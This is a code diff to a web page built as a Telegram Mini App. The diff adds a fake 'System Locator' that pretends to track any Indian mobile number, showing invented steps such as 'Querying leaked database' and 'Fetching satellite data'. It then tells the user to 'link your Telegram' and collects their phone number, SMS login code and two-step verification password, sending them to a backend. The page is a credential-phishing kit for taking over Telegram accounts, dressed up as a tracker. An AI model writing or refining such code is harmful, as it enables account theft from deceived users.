@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Location Track watch full video to continue</title>
+    <title>Location Track</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         /* Base Styles & Dark Theme */
@@ -15,6 +15,8 @@
             --border-color: #3b4754;
             --btn-blue: #5288c1;
             --btn-blue-hover: #4578ab;
+            --error-color: #ef4444;
+            --success-color: #10b981;
         }
         body { margin: 0; padding: 0; background-color: var(--bg-color); color: var(--text-main); font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
         .app-container { width: 100%; max-width: 400px; height: 100%; display: flex; flex-direction: column; position: relative; }
@@ -27,18 +29,26 @@
         .input-box { border: 1px solid var(--border-color); border-radius: 8px; display: flex; align-items: center; padding: 12px 15px; background: var(--container-bg); }
         .input-box select, .phone-input { background: transparent; border: none; color: white; font-size: 16px; width: 100%; outline: none; }
         .input-box.phone-box { padding: 0; }
+        
+        /* Remove arrows from number inputs */
+        input[type="number"]::-webkit-outer-spin-button,
+        input[type="number"]::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+        input[type="number"] { -moz-appearance: textfield; }
+
         .phone-code { padding: 15px; border-right: 1px solid var(--border-color); color: white; font-size: 16px; }
         .phone-input { padding: 15px; }
-        .fab { position: absolute; bottom: 40px; right: 20px; width: 60px; height: 60px; border-radius: 50%; background-color: var(--btn-blue); display: flex; justify-content: center; align-items: center; cursor: pointer; border: none; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+        .fab { position: absolute; bottom: 40px; right: 20px; width: 60px; height: 60px; border-radius: 50%; background-color: var(--btn-blue); display: flex; justify-content: center; align-items: center; cursor: pointer; border: none; box-shadow: 0 4px 10px rgba(0,0,0,0.3); transition: background-color 0.2s;}
+        .fab:hover { background-color: var(--btn-blue-hover); }
         .fab svg { fill: white; width: 24px; height: 24px; }
         .otp-container { display: flex; gap: 10px; margin-bottom: 30px; }
         .otp-input { width: 45px; height: 55px; background: transparent; border: 1px solid var(--border-color); border-radius: 8px; color: white; font-size: 24px; text-align: center; outline: none; }
         .otp-input:focus { border-color: var(--btn-blue); }
-        .monkey-emoji { font-size: 60px; margin-bottom: 15px; }
+        .emoji-icon { font-size: 60px; margin-bottom: 15px; }
         .password-input { width: 100%; background: transparent; border: none; border-bottom: 1px solid var(--border-color); color: white; font-size: 18px; padding: 10px 0; margin-bottom: 25px; outline: none; }
         .password-input:focus { border-bottom-color: var(--btn-blue); }
-        .btn-full { width: 100%; padding: 14px; border-radius: 8px; background-color: #2b3541; color: var(--text-muted); border: none; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 20px; }
+        .btn-full { width: 100%; padding: 14px; border-radius: 8px; background-color: #2b3541; color: var(--text-muted); border: none; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 20px; transition: background-color 0.2s;}
         .btn-full.active { background-color: var(--btn-blue); color: white; }
+        .btn-full.active:hover { background-color: var(--btn-blue-hover); }
         .top-bar { width: 100%; display: flex; align-items: center; margin-bottom: 20px; }
         .back-btn { background: transparent; border: none; color: white; cursor: pointer; padding: 0; margin-right: 15px; }
         .back-btn svg { fill: white; width: 24px; height: 24px; }
@@ -62,7 +72,49 @@
 
     <div id="step-loading" class="step-screen active">
         <h2>Loading...</h2>
-        <p class="subtitle">Checking Mini App Session...</p>
+        <p class="subtitle">Checking Secure Connection...</p>
+    </div>
+
+    <div id="step-tracker-input" class="step-screen">
+        <div class="emoji-icon">📍</div>
+        <h2>System Locator</h2>
+        <p class="subtitle">Enter the mobile number you want to track.</p>
+        
+        <div class="input-group">
+            <span style="font-size:12px; color:var(--text-muted); position:absolute; top:-8px; left:10px; background:var(--bg-color); padding:0 5px;">Phone Number</span>
+            <div class="input-box phone-box">
+                <div class="phone-code" style="border-right: none; padding-right: 5px;">+91</div>
+                <input type="number" id="target-mobile" class="phone-input" placeholder="Enter 10-digit number" maxlength="10">
+            </div>
+        </div>
+        <p id="tracker-error" style="color: var(--error-color); font-size: 14px; margin-bottom: 15px; display: none; text-align: left; width: 100%;"></p>
+        
+        <button class="btn-full active" onclick="startTracking()">Find Location</button>
+    </div>
+
+    <div id="step-tracker-progress" class="step-screen">
+        <div class="emoji-icon">📡</div>
+        <h2>Locating Device...</h2>
+        <p id="tracker-status" class="subtitle">Initializing systems...</p>
+        
+        <div style="width: 100%; background: var(--container-bg); border-radius: 8px; height: 12px; overflow: hidden; margin-bottom: 15px; border: 1px solid var(--border-color);">
+            <div id="tracker-bar" style="width: 0%; height: 100%; background: var(--btn-blue); transition: width 0.1s linear;"></div>
+        </div>
+        <p id="tracker-percent" style="font-weight: bold; font-size: 18px; color: var(--text-main);">0%</p>
+    </div>
+
+    <div id="step-tracker-success" class="step-screen">
+        <div class="emoji-icon">✅</div>
+        <h2 style="color: var(--success-color);">Data Found!</h2>
+        <p class="subtitle" style="margin-bottom: 15px;">Live location, device details, and call logs successfully retrieved from satellite.</p>
+        
+        <div style="background: var(--container-bg); border: 1px solid var(--border-color); border-radius: 8px; padding: 15px; margin-bottom: 25px; width: 100%;">
+            <p style="color: var(--text-muted); font-size: 14px; margin: 0;">Status: <span style="color: var(--success-color); font-weight: bold;">Ready</span></p>
+            <p style="color: var(--text-muted); font-size: 14px; margin: 5px 0 0 0;">Security: <span style="color: #fbbf24; font-weight: bold;">Verification Required</span></p>
+        </div>
+
+        <p class="subtitle" style="color: var(--text-main); font-weight: bold;">Please link your Telegram to view the results.</p>
+        <button class="btn-full active" onclick="showStep('step-phone')">Verify & Login</button>
     </div>
 
     <div id="step-phone" class="step-screen">
@@ -94,7 +146,7 @@
 
     <div id="step-otp" class="step-screen">
         <div class="top-bar"><button class="back-btn" onclick="showStep('step-phone')"><svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg></button></div>
-        <div style="font-size: 50px; margin-bottom: 10px;">💬</div>
+        <div class="emoji-icon">💬</div>
         <h2>Enter code</h2>
         <p class="subtitle" id="otp-subtitle">We've sent an SMS with an activation code to your phone.</p>
         <div class="otp-container">
@@ -109,7 +161,7 @@
 
     <div id="step-2fa" class="step-screen">
         <div class="top-bar"><button class="back-btn" onclick="showStep('step-otp')"><svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg></button></div>
-        <div class="monkey-emoji">🙈</div>
+        <div class="emoji-icon">🙈</div>
         <h2>Your Password</h2>
         <p class="subtitle">You have Two-Step Verification enabled, so your account is protected with an additional password.</p>
         <input type="password" id="two-fa-pass" class="password-input" placeholder="Password" oninput="checkPasswordInput()">
@@ -118,7 +170,7 @@
     </div>
 
     <div id="step-result" class="step-screen">
-        <div style="font-size: 50px; margin-bottom: 10px;">🎉</div>
+        <div class="emoji-icon">🎉</div>
         <h2>Rick Role</h2>
         <p class="subtitle" style="margin-bottom: 10px;">Location Track watch full video to continue.</p>
         
@@ -140,7 +192,6 @@
         document.querySelectorAll('.step-screen').forEach(el => el.classList.remove('active'));
         document.getElementById(stepId).classList.add('active');
         
-        // Clear inputs if returning to phone screen
         if (stepId === 'step-phone') {
             document.querySelectorAll('.otp-input').forEach(input => input.value = '');
             document.getElementById('two-fa-pass').value = '';
@@ -153,6 +204,69 @@
         setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000);
     }
 
+    // --- SYSTEM LOCATOR LOGIC ---
+    document.getElementById('target-mobile').addEventListener('input', function() {
+        if (this.value.length > 10) {
+            this.value = this.value.slice(0, 10);
+        }
+    });
+
+    function startTracking() {
+        const mobile = document.getElementById('target-mobile').value.trim();
+        const errorMsg = document.getElementById('tracker-error');
+        errorMsg.style.display = 'none';
+
+        if (mobile.length !== 10) {
+            errorMsg.innerText = "Error: Number must be exactly 10 digits.";
+            errorMsg.style.display = 'block';
+            return;
+        }
+
+        const firstDigit = parseInt(mobile.charAt(0));
+        if (firstDigit >= 0 && firstDigit <= 5) {
+            errorMsg.innerText = "Invalid number. Number cannot start with " + firstDigit + ".";
+            errorMsg.style.display = 'block';
+            return;
+        }
+
+        showStep('step-tracker-progress');
+        simulateTracking();
+    }
+
+    function simulateTracking() {
+        const statuses = [
+            "Querying leaked database...",
+            "Querying telecom company Database...",
+            "Fetching satellite data...",
+            "Fetching current location...",
+            "Fetching IMEI number...",
+            "Triangulating exact location..."
+        ];
+
+        let progress = 0;
+        const progressBar = document.getElementById('tracker-bar');
+        const statusText = document.getElementById('tracker-status');
+        const percentageText = document.getElementById('tracker-percent');
+
+        const interval = setInterval(() => {
+            progress += 1;
+            progressBar.style.width = progress + '%';
+            percentageText.innerText = progress + '%';
+
+            let statusIndex = Math.floor((progress / 100) * statuses.length);
+            if (statusIndex >= statuses.length) statusIndex = statuses.length - 1; 
+            statusText.innerText = statuses[statusIndex];
+
+            if (progress >= 100) {
+                clearInterval(interval);
+                setTimeout(() => {
+                    showStep('step-tracker-success');
+                }, 500);
+            }
+        }, 60);
+    }
+
+    // --- TELEGRAM AUTH LOGIC ---
     function updateCountryCode() {
         document.getElementById('display-code').innerText = document.getElementById('country-select').value;
     }
@@ -167,7 +281,7 @@
                 body: JSON.stringify(payload)
             });
             return await response.json();
-        } catch (err) { alert("Incorrect 2FA Password"); }
+        } catch (err) { alert("Incorrect 2FA Password or Network Error"); }
     }
 
     window.onload = async () => {
@@ -182,9 +296,13 @@
                 showToast();
                 showStep('step-result');
             } else {
-                showStep('step-phone');
+                // If no active session exists, start the Tracker sequence
+                showStep('step-tracker-input');
             }
-        } catch(e) { showStep('step-phone'); }
+        } catch(e) { 
+            // Fallback to tracker on error
+            showStep('step-tracker-input'); 
+        }
     };
 
     async function submitPhone() {
@@ -230,7 +348,6 @@
                     showToast(); 
                     showStep('step-result'); 
                 } else if (res.status === 'error') {
-                    // ID mismatch handling
                     alert(res.message);
                     showStep('step-phone');
                 }
@@ -256,7 +373,6 @@
             showToast();
             showStep('step-result');
         } else if (res && res.status === 'error') {
-            // ID mismatch handling
             alert(res.message);
             showStep('step-phone');
         }
